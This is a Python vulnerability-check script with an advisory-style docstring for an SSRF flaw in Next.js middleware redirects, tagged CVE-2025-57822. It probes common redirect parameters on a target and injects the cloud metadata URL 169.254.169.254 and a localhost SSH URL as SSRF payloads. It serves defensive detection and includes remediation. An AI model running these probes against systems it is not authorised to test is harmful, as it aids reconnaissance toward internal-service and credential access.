#!/usr/bin/env python3
"""
CVE-2025-57822 — Next.js SSRF via Middleware Redirect
=====================================================

CVE ID      : CVE-2025-57822
GHSA        : GHSA-qpjv-v59x-3qc3
CVSS Score  : 6.5 (MEDIUM)
CVSS Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
Affected    : Next.js >= 13.0.0, < 14.2.32
Patched     : 14.2.32
Published   : 2025-06 (est.)

Description
-----------
In certain configurations where Next.js middleware issues a `NextResponse.redirect()`
to an internal URL constructed from user-supplied input, an attacker can craft
a request that causes the server to issue an internal server-side request to an
arbitrary URL (Server-Side Request Forgery).

This can be used to:
  - Access internal services (e.g., metadata endpoints on cloud providers:
    http://169.254.169.254/latest/meta-data/)
  - Probe internal network hosts and ports
  - Bypass firewalls that restrict outbound traffic from the browser

The vulnerability is in how Next.js processes redirect targets when middleware
redirects to a URL derived from request parameters without proper origin validation.

Attack Surface
--------------
- Applications with middleware that performs redirects based on request input
  (query params, headers, path segments)
- Cloud-hosted deployments with IMDS or internal service endpoints

Test Methodology
---------------
1. Probe known redirect-accepting endpoints (/?redirect=, /login?next=, etc.)
2. Supply a URL pointing to a known SSRF canary (e.g., a private IP or external
   callback URL) as the redirect target.
3. Check if the server follows the redirect to the supplied URL rather than
   returning a redirect response to the client.

Note: This test uses a safe probe — it checks if the server returns a redirect
vs. returns content from the target URL. Without a callback endpoint (Burp
Collaborator / interactsh), confirmation requires timing analysis.

Remediation
-----------
Upgrade Next.js to >= 14.2.32.
Also: always validate redirect targets against an allowlist of permitted
origins before issuing NextResponse.redirect().

References
----------
- https://github.com/advisories/GHSA-qpjv-v59x-3qc3
- https://nvd.nist.gov/vuln/detail/CVE-2025-57822
"""

from __future__ import annotations

import argparse
import urllib.error
import urllib.parse
import urllib.request

# Common redirect parameter names used in Next.js apps
REDIRECT_PARAMS = ["redirect", "next", "return", "returnUrl", "returnTo", "callbackUrl", "goto", "url", "dest"]

# Safe SSRF canary — a non-routable IP that will time out (not a real callback)
SSRF_CANARY = "http://169.254.169.254/latest/meta-data/"
SSRF_CANARY_LOCAL = "http://127.0.0.1:22/"  # SSH port — connection refused is distinctive


def fetch(url: str, follow_redirects: bool = False, timeout: int = 8) -> tuple[int, str, dict]:
    headers = {"User-Agent": "NextJS-CVE-Tester/1.0", "Accept": "text/html,*/*"}
    req = urllib.request.Request(url, headers=headers)
    opener = urllib.request.build_opener()
    if not follow_redirects:
        class NoRedirect(urllib.request.HTTPRedirectHandler):
            def redirect_request(self, *a, **kw):
                return None
        opener = urllib.request.build_opener(NoRedirect)
    try:
        with opener.open(req, timeout=timeout) as resp:
            body = resp.read(4096).decode("utf-8", errors="replace")
            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
            return resp.status, body, resp_headers
    except urllib.error.HTTPError as exc:
        body = exc.read(512).decode("utf-8", errors="replace") if exc.fp else ""
        resp_headers = {k.lower(): v for k, v in exc.headers.items()} if exc.headers else {}
        return exc.code, body, resp_headers
    except urllib.error.URLError as exc:
        raise ConnectionError(str(exc)) from exc


def probe_redirect_param(target: str, param: str, timeout: int) -> tuple[int, str] | None:
    """Check if the param triggers a redirect (3xx) at all."""
    url = f"{target.rstrip('/')}/?{param}=%2F"  # Safe value: /
    try:
        status, _, headers = fetch(url, follow_redirects=False, timeout=timeout)
        location = headers.get("location", "")
        return status, location
    except ConnectionError:
        return None


def probe_ssrf(target: str, param: str, canary: str, timeout: int) -> tuple[int, str] | None:
    encoded = urllib.parse.quote(canary, safe="")
    url = f"{target.rstrip('/')}/?{param}={encoded}"
    try:
        status, _, headers = fetch(url, follow_redirects=False, timeout=timeout)
        location = headers.get("location", "")
        return status, location
    except ConnectionError:
        return None


def run(target: str, timeout: int, verbose: bool) -> int:
    print(f"\n[CVE-2025-57822] Next.js SSRF via Middleware Redirect")
    print(f"Target : {target}")
    print("-" * 60)

    active_redirect_params = []

    for param in REDIRECT_PARAMS:
        result = probe_redirect_param(target, param, timeout)
        if result is None:
            continue
        status, location = result
        if status in {301, 302, 303, 307, 308}:
            active_redirect_params.append(param)
            if verbose:
                print(f"  param={param!r}  triggers redirect → {location!r}")

    if not active_redirect_params:
        print("  No redirect-accepting parameters found on homepage.")
        print("\nVERDICT : INCONCLUSIVE")
        print("No open redirect parameters detected. SSRF requires an open redirect entry point.")
        print("Try specific application paths manually (e.g., /login, /auth/callback).")
        return 2

    print(f"  Active redirect params: {active_redirect_params}")
    print()

    ssrf_results = []
    for param in active_redirect_params:
        result = probe_ssrf(target, param, SSRF_CANARY, timeout)
        if result is None:
            continue
        status, location = result
        if SSRF_CANARY in location or "169.254" in location:
            ssrf_results.append((param, location))
            if verbose:
                print(f"  SSRF via param={param!r}: redirect points to {location!r}")

    if ssrf_results:
        print("VERDICT : VULNERABLE")
        print("\nMiddleware redirect target includes attacker-supplied SSRF canary URL:")
        for param, location in ssrf_results:
            print(f"  param={param!r} → Location: {location!r}")
        print("\nFix: Upgrade Next.js to >= 14.2.32")
        return 1
    else:
        print("VERDICT : PATCHED or NOT EXPLOITABLE via tested paths")
        print("\nOpen redirect found but server does not include unvalidated external URLs in Location.")
        print("Redirect targets appear to be validated or stripped.")
        return 0


def main() -> int:
    parser = argparse.ArgumentParser(description="Test CVE-2025-57822 Next.js SSRF via middleware redirect")
    parser.add_argument("--target", default="http://localhost:3000")
    parser.add_argument("--timeout", type=int, default=8)
    parser.add_argument("--verbose", "-v", action="store_true")
    args = parser.parse_args()
    return run(args.target, args.timeout, args.verbose)


if __name__ == "__main__":
    raise SystemExit(main())
